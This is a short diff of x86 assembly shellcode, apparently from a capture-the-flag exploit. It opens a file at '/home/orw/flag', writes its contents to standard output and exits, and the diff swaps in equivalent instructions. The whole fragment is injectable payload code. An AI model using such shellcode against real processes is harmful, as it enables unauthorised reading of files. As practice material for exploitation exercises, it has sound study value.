@@ -8,7 +8,7 @@ push 0x67616c66
 push 0x2f2f7772
 push 0x6f2f2f65
 push 0x6d6f682f
-mov ebx,esp
+lea ebx,[esp]
 xor eax,eax
 mov al,5
 int 0x80
@@ -22,13 +22,13 @@ int 0x80
 xor eax,eax
 mov al,4
 xor ebx,ebx
-inc ebx
+inc bl
 lea ecx,[esp]
 mov dl,40
 int 0x80
 
 xor eax,eax
-inc eax
+inc al
 xor ebx,ebx
 int 0x80'''
 
